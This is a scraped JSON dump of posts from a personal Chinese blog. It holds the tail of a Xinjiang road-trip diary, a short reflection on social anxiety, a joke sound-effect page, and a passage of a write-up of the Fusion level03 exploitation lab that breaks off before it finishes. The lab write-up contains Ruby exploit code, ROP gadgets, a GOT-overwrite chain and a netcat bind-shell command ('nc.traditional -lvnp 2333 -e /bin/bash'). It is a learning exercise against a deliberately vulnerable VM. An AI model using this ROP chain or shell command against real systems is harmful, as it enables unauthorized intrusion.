伊犁是个地区，其中有一个城市叫伊宁市。\n路上的风景好看么？好看的吧，应该。但是已经走过唐布拉百里画廊和库尔德宁十里画廊了，这个似乎与他们区别也不大\u0026hellip;\n第二天一早前往汉人街大巴扎！说是汉人街，但其实主要是维族人。大巴扎也不是面向游客的，而是就是本地大集市，于是没有过多停留就去了附近的喀攒其景区。感觉很像喀什商业街，但是建筑风格蓝色更多，而且其实本来是居民区，所以不像喀什老街那边全是卖东西，这边生活气息要稍微重一些。\n晚上又去逛街了，这回是六星街。这下感觉喀什味就很浓了。\n误打误撞进了一个冰激凌店，好像是什么网红手工冰激凌？确实在喀攒齐那边也见到不少「伊犁古法手工冰激凌」。店里装修很好看，冰激凌可以调料也挺新奇的，不过才发现自己吃了冰激凌的话，再试着咀嚼葡萄干会牙疼，害怕。\n第二天去可克达拉市转了一下。是新建的一个城市，对应的是农四师。很多建筑是江南园林风格挺神奇的，但是人实在好少啊。看了一下规划馆，然后看了一下伊力特酒厂。酒厂里有 70 多度的原浆可以喝。我爸尝了，但是我要开车所以不能喝了。好可惜。\n摄于六十一团。因为离霍尔果斯口岸很近所以住了一晚上。在附近的山上转了下，返回路上遇到一大片羊，就是不愿让开。于是牧羊人就骑着摩托车开路。另外牧羊人带的三只狗狗，其中一只一直追着车吼x\n至于霍尔果斯，虽然说起来算是个大点的免税区，但里面东西并不见得便宜多少，（除了烟酒，可能确实便宜。但是又不能倒卖，所以对我没兴趣x）有些商场里面装修还挺烂的，像是有个十几年的感觉了都。并没有买什么东西，只挑了一些没见过的零食。\n前往乌鲁木齐的路上经过了果子沟大桥和塞里木湖。前者附近是不让停车的，看过从很远地方的航拍是很好看。至于后者，已经见过了青海湖，所以感觉也就那样，完全没有停留。\n还有就是独山子大峡谷。\n这个景点一言难尽。总之大峡谷颜色灰蒙蒙的一点层次都没用，然后景点主要经营的是高空滑索玻璃栈道之类的娱乐项目\u0026hellip;我一个拍风光的凑什么热闹呢，爬爬x\n乌鲁木齐 有两个比较有名的风光景点，都是和天山有关的？另一个忘了，总之我去的是天池。虽然从大众点评来看很多人都在提问区骂景点圈钱。（为什么不是评论区？因为评论区关了草）\n门票确实有点贵，加上车票（必须）是 CNY 155。另外无人机需要报备。刚进去甚至还在下雨，但是运气很好放晴了，于是也有不错的照片。\n有试着无人机拍延时，但出事了。虽然气温不高但是太阳很烈，遥控器用的是手机做监视器结果没一会 iPhone 过热了\u0026hellip;无人机还在天上飞着，于是赶紧换了一个手机插上。还好是能无缝继续飞着，但是延时摄影还是自动停止掉了。\n运气很好看到了松鼠，但是枝丫太多拍不清。如果愿意再往人少的森林木栈道走走的话好像是能见到不少的，但是那天很疲倦了。\n还是感觉既然我已经去过了大龙池那样的地方了，那么天山天池相比起来就很平庸了。\n乌鲁木齐博物馆似乎很不错，但是要预约，而我没有太多时间可以停留了，于是去了下大巴扎就打算离开。\n怎么说呢，依然商业街，食物和手工品都有的那种。周围是还算高（四五层）的大楼，中间是摆摊的区域。价格没有细看，但是关于英吉沙小刀的话，同样一个款式一个店能给 60 的价格，另一个店就是 300 了，好坑\u0026hellip;\n哈密 在新疆的最后一站，到了一个叫做巴里坤湖的地方。\n也是盐湖，也有草原，但是臭臭的\u0026hellip;好像是因为某种草吧。反射度和茶卡盐湖差不多，鸟类和云的倒影清晰可见（但是茶卡盐湖没有鸟）。另外晚点夕阳竟然把云染成了血雾的颜色，也算奇观。\n返程 回来路上走的是丝绸之路这段。不过以前大部分景点都去过所以没怎么停留。不过可以感到的是离开新疆之后，小孩子的浓度高了起来。在陕西壶口的酒店住的时候，那天早饭几乎每桌都有一个甚至更多的小孩子。而且这个壶口瀑布又是一个想钱想疯了的景观，故意很远的游客中心，摆渡车，坑人小吃街应有尽有，于是不想去。\n于是总计 26 天，回到了上海。带回来了一堆特产比如瓜。猫猫可能会以为我们出去打猎了吧w\n刚开始出发的很多东西不仔细想已经记不清了，但幸好一路上有在写日记和拍照记录。真的很幸运几个月前突然手痒买了相机这件事，这些记录下来的影像虽然或许普通，但是却能是触发回忆的扳机，让许多细节都还能回忆得起来，还能感受到当时的心情。\n","date":"2024-07-20T21:10:05+08:00","image":"/p/trip_xinjiang/IMG_5551_hu9fe9193128a3e752447e4a637abb76f6_1008379_120x120_fill_box_smart1_3.PNG","permalink":"/p/trip_xinjiang/","title":"26 天新疆自驾！虽然以前也有过但是以前没有拍照片写日记所以忘差不多了，但这次不一样"},{"content":"才知道认识的两个人互相之间特别特别讨厌对方，但表面上看起来相处得却很融洽。如果是这样的话，也有可能所有人都很讨厌我，但并不会说出来。\n那么，只是在脑子里讨厌我的话，我永远也找不到任何证明的方法，或许我在把 ta 们当成朋友对待的时候我正被当成傻逼。这么想来社交确实很可怕呢。\n已读回执和最近在线时间也是可怕的东西。毕竟不知道是否已读的状态下过很久也没回复总感觉自己像是被丢到一边不管了一样，但是知道对方并没有已读的话还比较容易安慰一下自己的吧\u0026hellip;？\n不过到底是怎么会觉得对方没有已读的呢\u0026hellip;？毫无依据的这么想绝对是想创造自己没有被讨厌的理由吧，然而实际上就是已读不回的概率要大得多。所以说到底有没有已读回执还是最近在线时间都无所谓，被讨厌就是被讨厌仅此而已。\n问到「你是不是也讨厌我」而被回答「没有怎么会呢」时，大概分两种情况。一种是对此人无感而莫名其妙得「没有怎么会呢」，另一种是本来就不喜欢但觉得自己应该还想当好人/还不至于撕破脸皮于是虽然想着「你竟然还有自觉知道自己很烦人」但说出口的却是「没有怎么会呢」。\n然后，以为自己终于不会被讨厌了，以为终于可以真心对待别人了，实际上之后也不过是在被耐着性子应付而已。\n介于第二种情况实在是太可怕了，可怕到甚至不敢赌「只是无感」的可能性，所以这种问题还是不要问比较好。\n或者是收获「是的就是很讨厌你」这样的回答也不坏，至少之后不用再想太多。\n","date":"2024-03-18T20:58:23Z","permalink":"/p/mem-dumpmar-18-2024/","title":"Mem Dump - Mar 18 2024"},{"content":"灵感来源：bilibili\n你需要：一个鼠标 然后点这里，再拍桌子就可以异议了（\n可选音效：\n『異議あり！』 \u0026ldquo;Objection!\u0026rdquo; 『待った！』 \u0026ldquo;Hold it!\u0026rdquo; 『くらえ！』 \u0026ldquo;Take that!\u0026rdquo; p.s. 保持鼠标指针在窗口内 p.p.s. 如果不是很灵敏可以试着提高指针灵敏度\n","date":"2024-03-18T12:52:23Z","image":"/p/kusa-igiari/cover_hu41c831daa4e3e053d1d7f5f75484b0e3_1347122_120x120_fill_box_smart1_3.png","permalink":"/p/kusa-igiari/","title":"过于生草的「異議あり！」"},{"content":"☞ 这是我最后的波纹\n总之要返校了，之后大概没太多时间玩这些了\u0026hellip;\n一开始我看着这题，感觉也就是源码有点长吧\n结果却花了接近三周\u0026hellip;（虽然也可能是我很摸..但是..但真的很难啊x\nLevel 03 ☞ https://exploit.education/fusion/level03/\nAbout\nThis level introduces partial hash collisions (hashcash) and more stack corruption\nOption Setting Vulnerability Type Stack Position Independent Executable No Read only relocations No Non-Executable stack Yes Non-Executable heap Yes Address Space Layout Randomisation Yes Source Fortification No Source code\n☞ 太长所以还是放源网页吧\nOverview 总之这个程序想做的事情大致是：\n用户用 socket 连上去，发一个 json； 这个 json 包含 标题，标签，正文，服务器地址 等内容，相当于一篇博客文章了； 然后这个程序把 json 解析后发布到那个服务器地址； 这题除了主函数以外还有 8 个函数，执行顺序是：\n0. main()\n类似于一个 daemon，每次有一个请求的时候都会 fork 一个子进程来处理这个请求\n以及把 STDIN 和 STDOUT 都指向了 socket（具体实现是在题目作者没有给出的头文件里面\n1. send_token()\n调用 generate_token() 生成一段类似 \u0026ldquo;// 192.168.215.1:56730-1653879913-1329588598-830759485-962559078\u0026rdquo; 的 token\n可以看到这个 token 里面含有请求的 ip:port，剩下的部分都是随机数\n然后通过 socket 发出去\n2. read_request()\n反复读取，读到的内容 unsigned char *gRequest 和 int gRequestSize 都是全局变量\nread(0, gRequest + gRequestSize, gRequestMax - gRequestSize); ...... if(gRequestSize == gRequestMax) { gRequest = realloc(gRequest, gRequestMax * 2); ...... close(0); close(1); close(2); 这里的读取是可以根据大小来 realloc 的，没法 bof\n想结束读取的话直接把 socket 的写关掉就好（ruby 的话是 BasicSocket#close_write\n另外这里最后会把 STDIN，STDOUT 关掉..\n3. validate_request() \u0026amp; 4. parse_request()\nvalidate_request()，首先会检查读到内容 gRequest 的开头有没有那个 token，没有会退出\n其次检查用 token 和 gRequest 算出来的 HAMC 前两个字节是否为 \\x00，否的话退出\nparse_request() 会检查 gRequest 除去 token 的部分是否是一段有效的 json\n所以我们的 payload 需要：\n首先在最开头包含 token，接下来包含一段 json，最后是一段随机字符串\n随机字符串的意义是让每次 HMAC 的值都不相同\n我们需要重复这个操作直到 HMAC 的前两个字节是 \\x00\nputs \u0026#34;==\u0026gt; calculating hmac...\u0026#34; while true do # random string to make the result of hmac different every time ranstr = SecureRandom.hex # add this \u0026#34;\\n\u0026#34; to seperate token and payload # or the json_tokener_parse(gRequest) in parse_request() will not wor payload = token + \u0026#34;\\n\u0026#34; + json + ranstr hmac = OpenSSL::HMAC.hexdigest \u0026#39;SHA1\u0026#39;, token, payload if hmac[0..3] == \u0026#34;0000\u0026#34; then puts \u0026#34;done\u0026#34; puts \u0026#34;==\u0026gt; use random string:\\n\u0026#34; + ranstr puts \u0026#34;==\u0026gt; created payload:\\n\u0026#34; + payload.inspect puts \u0026#34;==\u0026gt; hmac result:\\n\u0026#34; + hmac break end end 这样之后的 payload 就可以发出去并通过这两个检查了\n5. handle_request()\n用 decode_string() 解析 json 中的 tags，title，contents，serverip 标签\n6. post_blog_article()\n根据前面解析到的 serverip 标签，重新开一个 STDOUT 把内容写出去\nVulnerability 出现在：\n5. handle_request()\n这个函数的作用是，使用 decode_string() 解析 json 中的 tags，title，contents，serverip 标签\n但是 decode_string() 有一个小问题：\n它的作用是，一个字符一个字符的解析\n当遇到了转义符号反斜杠 \\，\n比如读到了 \\n（准确的说，遇到了一个反斜杠，后面连着一个字符 n 时），会把它替换成真正的 ASCII 字符 0x10, LF, LINE FEED，也就是换行符，这是把两个字符换成了一个字符\n当遇到 \\u 也就是 unicode 转义时也会做同样的事情，但是\u0026hellip;\nvoid decode_string(const char *src, unsigned char *dest, int *dest_len) { ...... end = dest + *dest_len; while(*src \u0026amp;\u0026amp; dest != end) { ...... if(*src == \u0026#39;\\\\\u0026#39;) { *src++; ...... switch(*src) { ...... case \u0026#39;u\u0026#39;: src++; memcpy(swap, src, 4); p = NULL; what = strtol(swap, \u0026amp;p, 16); *dest++ = (what \u0026gt;\u0026gt; 8) \u0026amp; 0xff; *dest++ = (what \u0026amp; 0xff); src += 4; break; ...... } // Outside the while loop // and record the actual space taken up *dest_len = (unsigned int)(dest) - (unsigned int)(start); ...... *dest 增加了两次\u0026hellip;\n例如，当出现 \\u1234，这个反斜杠已经是第 *dest_len - 1 个字符时，\n第 *dest_len 个字符会被换成 0x12\n第 *dest_len + 1 个字符会被换成 0x34\n而这里循环终止的条件其中之一是，dest != end，而 dest 已经在 end 更后方了\n这样的话就可以写入更多个字符，*dest_len 也会变更大\n那么在 handle_request() 中，\nunsigned char title[128]; unsigned char contents[1024]; ...... } else if(strcmp(key, \u0026#34;title\u0026#34;) == 0) { len = sizeof(title); decode_string(json_object_get_string(val), title, \u0026amp;len); gTitle = calloc(len+1, 1); gTitle_len = len; memcpy(gTitle, title, len); } else if(strcmp(key, \u0026#34;contents\u0026#34;) == 0) { len = sizeof(contents); decode_string(json_object_get_string(val), contents, \u0026amp;len); gContents = calloc(len+1, 1); gContents_len = len; memcpy(gContents, contents, len); ...... 就可以让 title 或者 contents 溢出了\nMain Purpose 既然已经明确了我们可以做什么，接下来理一下思路：\n我们遇到的限制是：\n开了 ASLR → libc 的地址会变，堆栈每次的地址也会变\n开了 NX → 就算能往堆栈上扔 shellcode 也没法执行\n我们能做到的事情有：\nbof 修改返回地址\n没开 PIE 所以还是可以 ROP → 只要知道一个 libc 函数的地址，就可以算出别的函数的偏移量\n以及，我们最终想要达到的效果是：\n用 system 函数绑定 tcp shell → system(\u0026quot;/bin/nc.traditional -lvnp 2333 -e /bin/bash\u0026quot;); → 注意得用 nc.traditional 否则是 netcat-openbsd，没有 -e 选项 Interact with Program 试着先发点正常的东西\n#!/usr/bin/ruby # encoding: ASCII-8BIT require \u0026#39;socket\u0026#39; require \u0026#39;openssl\u0026#39; require \u0026#39;securerandom\u0026#39; require \u0026#39;json\u0026#39; print \u0026#39;==\u0026gt; Enter hostname:\u0026#39; hostname = \u0026#39;192.168.215.135\u0026#39; port = 20003 $socket = TCPSocket.open(hostname, port) def press_to_c print \u0026#39;==\u0026gt; press enter to continue\u0026#39; gets end # Trim the double quotes from the beginning and end of the string token = $socket.gets token = token[1..token.length - 3] puts \u0026#34;==\u0026gt; received token:\\n#{token}\u0026#34; hash = { :tags =\u0026gt; [\u0026#39;meme\u0026#39;], :title =\u0026gt; \u0026#39;The quick brown fox jumps over the lazy dog\u0026#39;, :contents =\u0026gt; \u0026#39;My name is Giovanni Giorgio\u0026#39;, :serverip =\u0026gt; \u0026#39;192.168.1.5:8080\u0026#39; } puts \u0026#34;==\u0026gt; calculating hmac...\u0026#34; while true do # random string to make the result of hmac different every time ranstr = SecureRandom.hex #json = hash.to_json # add this \u0026#34;\\n\u0026#34; to seperate token and payload # or the json_tokener_parse(gRequest) in parse_request() will not work payload = token + \u0026#34;\\n\u0026#34; + hash.to_json + ranstr hmac = OpenSSL::HMAC.hexdigest \u0026#39;SHA1\u0026#39;, token, payload if hmac[0..3] == \u0026#34;0000\u0026#34; then puts \u0026#34;done\u0026#34; puts \u0026#34;==\u0026gt; use random string:\\n\u0026#34; + ranstr puts \u0026#34;==\u0026gt; created payload:\\n\u0026#34; + payload.inspect puts \u0026#34;==\u0026gt; hmac result:\\n\u0026#34; + hmac # \u0026#34;00008ad10c00e3...\u0026#34; =\u0026gt; \u0026#34;\\x00\\x00\\x8A\\xD1\\f\\x00\\xE3...\u0026#34; hmac = [hmac].pack \u0026#39;H*\u0026#39; break end end $socket.write payload press_to_c $socket.close_write 然后监听一下 8080 端口：\n❯ nc -l 8080 POST /blog/post HTTP/1.1 Connection: close Host: 192.168.1.5:8080 Content-Length: 74 The quick brown fox jumps over the lazy dog My name is Giovanni Giorgio% 成功了w\n接下来试着发一点不正常的东西\u0026hellip;\n# level03.rb ...... title = \u0026#34;w\u0026#34; * 127 title += \u0026#39;\\\\uAAAA\u0026#39; title += \u0026#34;w\u0026#34; * 31 title += \u0026#34;ABCD\u0026#34; hash = { :tags =\u0026gt; [\u0026#39;meme\u0026#39;], :title =\u0026gt; title, :contents =\u0026gt; \u0026#39;My name is Giovanni Giorgio\u0026#39;, :serverip =\u0026gt; \u0026#39;192.168.1.5:8080\u0026#39; } ...... # in my host machine ❯ ./tmp_lev03.rb ==\u0026gt; Enter hostname:==\u0026gt; received token: // 192.168.215.1:51038-1653896837-972326971-815702275-568244387 ==\u0026gt; calculating hmac... done ==\u0026gt; use random string: ebffe12131a81c7c82146945f23aaae9 ==\u0026gt; created payload: \u0026#34;// 192.168.215.1:51038-1653896837-972326971-815702275-568244387\\n{\\\u0026#34;tags\\\u0026#34;:[\\\u0026#34;meme\\\u0026#34;],\\\u0026#34;title\\\u0026#34;:\\\u0026#34;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\\\\\\\\uAAAAwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwABCD\\\u0026#34;,\\\u0026#34;contents\\\u0026#34;:\\\u0026#34;My name is Giovanni Giorgio\\\u0026#34;,\\\u0026#34;serverip\\\u0026#34;:\\\u0026#34;192.168.1.5:8080\\\u0026#34;}ebffe12131a81c7c82146945f23aaae9\u0026#34; ==\u0026gt; hmac result: 0000fbcac1e08dc00466ac809bed8a075ef41dfc ==\u0026gt; press enter to continue # inside fusion root@fusion:~# pidof level03 3259 3024 root@fusion:~# gdb -p 3259 ...... (gdb) c Continuing. Program received signal SIGSEGV, Segmentation fault. 0x44434241 in ?? () (gdb) Segmentation fault!! 成功w\n（当然不是一次成功的呢 的呢\n（如果能用 一种特别神奇的不会重复的序列 的话就能很快定位 title 到 return pointer 的偏移量了\n（python 的 pwntools 里就有这个方法 pwnlib.util.cyclic\n（但是我想用 ruby x\nFind Out ROP Chain 按照前面说过的，我们的目的是执行 ret2libc 执行 system 函数\n但是由于程序里并没有用过 system，所以动态链接表里是没这个的地址的\nfusion@fusion:~$ objdump -t /opt/fusion/bin/level03 | grep system # 什么都没有 虽然有 ASLR，但是 libc 内部各种函数之间的偏移量是固定的\n所以我们只能找另外一个可怜的 libc 函数（必须得是动态链接表里有记录的）\u0026hellip;然后算出偏移来，然后覆盖\n总之先考虑 ropchain 再考虑用哪个函数吧x\n首先需要对 「某个地址上的值进行加/减操作」 的 ropchain\n❯ ROPgadget --binary level03 --ropchain | grep \u0026#34;add dword ptr\u0026#34; 0x080493fc : add al, 8 ; add dword ptr [ebx + 0x5d5b04c4], eax ; ret 0x08049c93 : add dword ptr [ebx + 0x548b02c3], eax ; and al, 0x1c ; jmp 0x8049bfe 0x080493fe : add dword ptr [ebx + 0x5d5b04c4], eax ; ret 0x0804ab3e : add dword ptr [edx], ecx ; ret 0x0804ab37 : add eax, 0x3870486 ; add ebx, ebp ; add dword ptr [edx], ecx ; ret 0x0804ab3c : add ebx, ebp ; add dword ptr [edx], ecx ; ret 0x08048dc7 : fadd dword ptr [eax] ; add byte ptr [eax], al ; jmp 0x8048c00 0x08049c92 : inc ebx ; add dword ptr [ebx + 0x548b02c3], eax ; and al, 0x1c ; jmp 0x8049bfe 0x0804ab3a : xchg dword ptr [ebx], eax ; add ebx, ebp ; add dword ptr [edx], ecx ; ret # 这个好像挺不错： 0x080493fe : add dword ptr [ebx + 0x5d5b04c4], eax ; ret 那么，就需要：\n让 ebx + 0x5d5b04c4 是 某个可怜函数 funcA 的地址 让 eax 是 某个可怜函数 funcA 到 libc_system 之间的偏移量 所以需要 pop ebx 和 pop eax 操作：\n❯ ROPgadget --binary level03 --ropchain | grep \u0026#34;pop ebx ; ret\u0026#34; 0x08048beb : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret 0x08049a4c : add esp, 0x18 ; pop ebx ; ret 0x08048bed : add esp, 8 ; pop ebx ; ret 0x08049a4d : les ebx, ptr [eax] ; pop ebx ; ret 0x08048bee : les ecx, ptr [eax] ; pop ebx ; ret 0x08048be9 : mov dword ptr [0x83000016], eax ; les ecx, ptr [eax] ; pop ebx ; ret 0x08048bf0 : pop ebx ; ret 0x08048bea : push ss ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret # 直接就有，好诶 0x08048bf0 : pop ebx ; ret ❯ ROPgadget --binary level03 --ropchain | grep \u0026#34;pop eax ; ret\u0026#34; # 什么都没有...只能绕路了 ❯ ROPgadget --binary level03 --ropchain | grep \u0026#34;pop eax\u0026#34; 0x0804a942 : add byte ptr [eax], al ; pop eax ; add byte ptr [eax], al ; add byte ptr [eax], bl ; jmp 0x804a94a 0x0804a944 : pop eax ; add byte ptr [eax], al ; add byte ptr [eax], bl ; jmp 0x804a94a 0x08049b4f : pop eax ; add esp, 0x5c ; ret 0x0804a940 : xor al, 0 ; add byte ptr [eax], al ; pop eax ; add byte ptr [eax], al ; add byte ptr [eax], bl ; jmp 0x804a94a # 只有这个比较顺眼... 0x08049b4f : pop eax ; add esp, 0x5c ; ret 最后我们得到了这一串东西：\n1. 0x08048bf0 : pop ebx ; ret # 作用是把 2. 的值写进 ebx 2. # 在这里放上「funcA 的 got 地址 - 0x5d5b04c4」 #（减去这个数字是因为 6. 的 ebx 大了 0x5d5b04c4 3. 0x08049b4f : pop eax ; add esp, 0x5c ; ret # 作用是把 4. 的值写进 eax 4. # 「libc 里面，funcA 的地址 到 libc_system 的地址」之间的偏移量 5. # 这里得写上 0x5c 个字符，因为 3. 出现了 add esp, 0x5c 6. 0x080493fe : add dword ptr [ebx + 0x5d5b04c4], eax ; ret # 成功改写了 funcA 的 got 记录： # 即加上偏移量，变成了 system 的地址 7. # 在这里写 funcA 的 plt 地址， # 就会跳到改写了之后的 funcA 的 got 记录，就会跳到 system 8. # 这里应该是 system 结束之后的返回地址，可以不用管 9. # 这里放上 system 的参数， # 当然就是 \u0026#34;nc.traditional.....\u0026#34; 的字符串的位置 关于唐突出现的 plt 和 got，会在下面解释清楚\nCreate ROP Chain 胜利的公式已经写好了（不是\n接下来找个可怜的 libc 函数吧\nfusion@fusion:~$ objdump -R /opt/fusion/bin/level03 /opt/fusion/bin/level03: file format elf32-i386 DYNAMIC RELOCATION RECORDS OFFSET TYPE VALUE 0804bcc0 R_386_GLOB_DAT __gmon_start__ 0804bdc0 R_386_COPY stderr 0804bdc4 R_386_COPY stdi 0804bde0 R_386_COPY stdout 0804bcd0 R_386_JUMP_SLOT __errno_location 0804bcd4 R_386_JUMP_SLOT srand ..... 就决定是你了 srand！\n(gdb) p system $5 = {\u0026lt;text variable, no debug info\u0026gt;} 0xb7404b20 \u0026lt;__libc_system\u0026gt; (gdb) p srand $6 = {\u0026lt;text variable, no debug info\u0026gt;} 0xb73fafc0 \u0026lt;__srandom\u0026gt; 0xb7404b20 \u0026lt;__libc_system\u0026gt; - 0xb73fafc0 \u0026lt;__srandom\u0026gt; = 0x9B60\n啊 不行，这个偏移的值太小了，那字符串到了 0x00009B60 时会因为 null byte 被提前截断的\n（其实后来我发现这题可以用 \\u0000 来绕过 nullbyte 的限制x\n那就随便换一个（\n(gdb) p system $5 = {\u0026lt;text variable, no debug info\u0026gt;} 0xb7404b20 \u0026lt;__libc_system\u0026gt; (gdb) p srand $6 = {\u0026lt;text variable, no debug info\u0026gt;} 0xb73fafc0 \u0026lt;__srandom\u0026gt; (gdb) p write $8 = {\u0026lt;text variable, no debug info\u0026gt;} 0xb74892c0 \u0026lt;write\u0026gt; 这下 write 比 system 反而还大了！\n所以就可以偏移量就可以写一个负数，这个负数肯定是没有 null byte 的\n0xb74892c0 \u0026lt;write\u0026gt; - 0xb7404b20 \u0026lt;__libc_system\u0026gt; = 0x847A0\n0x0 - 0x847A0 = 0xFFF7B860\nplt? got? got.plt?? 有个小问题：\n上面几个都是已经链接了之后，再用 gdb 看的地址\u0026hellip;相当于是 libc 里面具体的实现部分\n因为会受 ASLR 影响，所以对我们的 ROP 来说没什么用\u0026hellip;也就是用来算一下偏移量\n(gdb) p write $8 = {\u0026lt;text variable, no debug info\u0026gt;} 0xb74892c0 \u0026lt;write\u0026gt; (gdb) x/10i write 0xb74892c0 \u0026lt;write\u0026gt;:\tcmpl $0x0,%gs:0xc 0xb74892c8 \u0026lt;write+8\u0026gt;:\tjne 0xb74892ec \u0026lt;write+44\u0026gt; 0xb74892ca \u0026lt;__write_nocancel\u0026gt;:\tpush %ebx 0xb74892cb \u0026lt;__write_nocancel+1\u0026gt;:\tmov 0x10(%esp),%edx ...... # 这里都是 libc 的 write 的具体实现 而我们所需要的效果是：call write，却运行了 system\n平常 gdb disas 的时候，我们可以看到这样的句子：\n0x0804902f \u0026lt;+31\u0026gt;:\tcall 0x8048cd0 \u0026lt;signal@plt\u0026gt;\n简单理一下 plt 和 got 的关联的话：\n.text 段不可修改，所以在运行时没法直接修改 call 的地址 所以 elf 就把可以修改的 .got 段用来记录外部函数地址 但实际上我们都是在 call plt 段；plt 段可以理解为一小块代码，是用来达到「找外部函数地址」的目的 也就是：\ncall \u0026lt;write@plt\u0026gt;，于是跳到了 plt plt 会看看 got 有没有写上真正的 libc 里的 write 的地址（libc 地址会受 ASLR 影响 → 有：直接跳到 got 里的记录 → 没有：就跳 ld.so 来找，然后写进 got 之后再遇到 call \u0026lt;write@plt\u0026gt; 的话，plt 就可以直接跳 got 记录了 # 这是 got 记录 fusion@fusion:~$ objdump -R /opt/fusion/bin/level03 DYNAMIC RELOCATION RECORDS 0804bd1c R_386_JUMP_SLOT write # got.plt 其实就是 got 的一部分，这里指向的地址 0xb74892c0 就是 libc 里具体实现的地址了 #（这里看起来 plt 已经找过一次了，所以才有记录 (gdb) x/x 0x0804bd1c 0x804bd1c \u0026lt;write@got.plt\u0026gt;:\t0xb74892c0 所以我们需要做的，是，把 got 里记录的 libc 里 write 的具体实现的地址 改成 libc 里 system 的具体实现的地址\n总之，write 的 got 记录：0x804bd1c\nwrite 的 plt 地址：0x8048d40\nfusion@fusion:~$ objdump -d /opt/fusion/bin/level03 | grep \u0026#34;write@plt\u0026#34; 08048d40 \u0026lt;write@plt\u0026gt;: 80495f5:\te8 46 f7 ff ff call 8048d40 \u0026lt;write@plt\u0026gt; 804a162:\te8 d9 eb ff ff call 8048d40 \u0026lt;write@plt\u0026gt; 以及，\u0026ldquo;nc.traditional\u0026hellip;\u0026rdquo; 写在 gContents 里，其地址为：0x0804bdf4\nfusion@fusion:~$ objdump -t /opt/fusion/bin/level03 | grep gContents 0804bdec g O .bss\t00000004 gContents_len 0804bdf4 g O .bss\t00000004 gContents 最终套回我们的公式：\n1. 0x08048bf0 : pop ebx ; ret # 作用是把 2. 的值写进 ebx 2. 0xAAA9B858 # 这里是「write 的 got 地址 0x0804bd1c - 0x5d5b04c4」 #（减去这个数字是因为 6. 的 ebx 大了 0x5d5b04c4 3. 0x08049b4f : pop eax ; add esp, 0x5c ; ret # 作用是把 4. 的值写进 eax 4. 0xFFF7B860 #「libc 里面，write 的地址 到 libc_system 的地址」之间的偏移量 5. \u0026#34;w\u0026#34; * 0x5c # 写上 0x5c 个字符，因为 3. 出现了 add esp, 0x5c 6. 0x080493fe : add dword ptr [ebx + 0x5d5b04c4], eax ; ret # 成功改写了 write 的 got 记录： # 即加上偏移量，变成了 system 的地址 7. 0x08048d40 # 在这里写 write 的 plt 地址， # 就会跳到改写了之后的 write 的 got 记录，就会跳到 system 8. 0x12345678 # 这里应该是 system 结束之后的返回地址，可以不用管 9. 0x0804bdf4 # 这里放上 system 的参数， # 当然就是 \u0026#34;nc.traditional.....\u0026#34; 的字符串的位置 END? 有个小问题，那就是 ruby 的 to_json 方法不接受非法 utf-8 字符\n也就是说\u0026hellip;比如 \u0026ldquo;\\x90\u0026rdquo;，这玩意超出了 ASCII 的范围，就会被当成 utf-8\n但是几乎百分百的是，这一个 \u0026ldquo;\\x90\u0026rdquo; 连上后面的东西都，没法被解析成任何 utf-8 字符\n就会报错：\n3.0.0 :001 \u0026gt; require \u0026#39;json\u0026#39; =\u0026gt; true 3.0.0 :002 \u0026gt; \u0026#34;\\x90\u0026#34;.to_json Traceback (most recent call last): 5: from /Users/senri/.rvm/rubies/ruby-3.0.0/bin/irb:23:in `\u0026lt;main\u0026gt;\u0026#39; 4: from /Users/senri/.rvm/rubies/ruby-3.0.0/bin/irb:23:in `load\u0026#39; 3: from /Users/senri/.rvm/rubies/ruby-3.0.0/lib/ruby/gems/3.0.0/gems/irb-1.3.0/exe/irb:11:in `\u0026lt;top (required)\u0026gt;\u0026#39; 2: from (irb):2:in `\u0026lt;main\u0026gt;\u0026#39; 1: from (irb):2:in `to_json\u0026#39; JSON::GeneratorError (source sequence is illegal/malformed utf-8) 所以又要绕弯子了\u0026hellip;\n先生成大部分正常的字符的 json，剩下不正常的我们自己换：\n...... title = \u0026#34;w\u0026#34; * 127 title += \u0026#39;\\\\\\\\\\uAAAA\u0026#39; title += \u0026#34;w\u0026#34; * 31 title += \u0026#34;ABCD\u0026#34; hash = { :tags =\u0026gt; [\u0026#39;meme\u0026#39;], # Ruby to_json issue with error \u0026#34;illegal/malformed utf-8\u0026#34; :title =\u0026gt; \u0026#39;_replace_\u0026#39;,#.to_s.force_encoding(\u0026#39;ISO-8859-1\u0026#39;), :contents =\u0026gt; \u0026#39;My name is Giovanni Giorgio\u0026#39;, :serverip =\u0026gt; \u0026#39;192.168.215.135:8080\u0026#39; } puts \u0026#34;==\u0026gt; original json:\u0026#34; json = hash.to_json puts json.b puts \u0026#34;==\u0026gt; replaced json:\u0026#34; json = json.dup.sub! \u0026#34;_replace_\u0026#34;, title puts json.b ...... title += '\\\\\\\\\\uAAAA' 的最终结果是 \\\\\\uAAAA（三个反斜杠，一个 u，四个 A），这纯粹是为了 json_tokener_parse(gRequest) 能解析出正常的东西来\njson = json.dup.sub! \u0026quot;_replace_\u0026quot;, title 这一串魔法一样的东西，是因为 json 变量被 forze 了，所以只好 duplicate 一下再 replace\n试一下：\n❯ ./level03.rb ==\u0026gt; Enter hostname:==\u0026gt; received token: // 192.168.215.1:60781-1654172438-234599792-1951713575-1038520033 ==\u0026gt; original json: {\u0026#34;tags\u0026#34;:[\u0026#34;meme\u0026#34;],\u0026#34;title\u0026#34;:\u0026#34;_replace_\u0026#34;,\u0026#34;contents\u0026#34;:\u0026#34;My name is Giovanni Giorgio\u0026#34;,\u0026#34;serverip\u0026#34;:\u0026#34;192.168.215.135:8080\u0026#34;} ==\u0026gt; replaced json: {\u0026#34;tags\u0026#34;:[\u0026#34;meme\u0026#34;],\u0026#34;title\u0026#34;:\u0026#34;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww\\\\uAAAAwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwABCD\u0026#34;,\u0026#34;contents\u0026#34;:\u0026#34;My name is Giovanni Giorgio\u0026#34;,\u0026#34;serverip\u0026#34;:\u0026#34;192.168.215.135:8080\u0026#34;} ==\u0026gt; calculating hmac... done ........ (gdb) c Continuing. Program received signal 